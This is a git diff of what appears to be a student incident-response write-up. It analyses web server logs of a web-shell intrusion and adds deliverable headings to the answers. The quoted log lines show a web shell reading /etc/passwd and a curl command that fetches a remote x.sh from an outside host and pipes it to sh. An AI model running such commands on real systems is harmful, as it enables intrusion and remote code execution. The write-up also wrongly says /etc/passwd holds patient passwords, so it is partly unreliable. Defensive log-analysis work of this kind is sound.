@@ -41,6 +41,8 @@ Time Source IP Session user Request Status Bytes Client
 12:00:01 10.0.0.5 - GET /healthz 200 2 NW-LB-Check/1.0
 ```
 
+## Deliverable 1:
+
 | Benign | Noise | Malicious |
 |----------|---------|---------------|
 | 192.0.2.160 | 192.0.2.10 | 203.0.113.50, 203.0.113.171|
@@ -54,6 +56,7 @@ Time Source IP Session user Request Status Bytes Client
 
 -	Malicious activity running a script on the server => 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
 
+## Deliverable 2:
 
 ### Did it work?
 - Yes the attack worked. This was possible from 203.0.113.171 attack from admin login portal and successfully uploading a python code as patient appointment which gave access to where patient passwords are stored (/etc/passwd) and running script on the server which granted access login.
@@ -64,6 +67,8 @@ Time Source IP Session user Request Status Bytes Client
 -	04:48:05 203.0.113.171 - GET /uploads/img3391.𝑝ℎ𝑝?𝑐=𝑐𝑎𝑡%20/𝑒𝑡𝑐/𝑝𝑎𝑠𝑠𝑤𝑑 200 1,873 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
 
 -	04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
+
+## Deliverable 3:
 
 ### Timeline: Attackers action steps:
 -	 Reconnaissance – Environment file discovery - The attacker requests /.env which suggests an attempt to discover exposed environment files containing application configuration and credentials which developers can sometimes forget to secure during application development.
@@ -78,6 +83,8 @@ Time Source IP Session user Request Status Bytes Client
 
 -	Remote command execution - The /x.sh script helped the attacker to remotely control and execute commands on the server.
 
+## Deliverable 4:
+
 ### First hour containment: 
 -	Contain the threat: Stop the threat from further spread. Isolate the server and stop vulnerable scans.
 
@@ -86,6 +93,8 @@ Time Source IP Session user Request Status Bytes Client
 -	Investigation: Check the PHP and .sh file and review running processes.
 
 -	Secure and recover: Patch the exploit and rotate exposed credentials and application secrets. Also check account privileges and disables unnecessary privileges.
+
+## Deliverable 5:
 
 ### Detection idea: 
 - Set a rule that detects suspicious encoded URL patterns that stops sensitive file access like get to /.env and /etc/passwd. Also rule that stops malicious file upload, remote command execution (RCE).
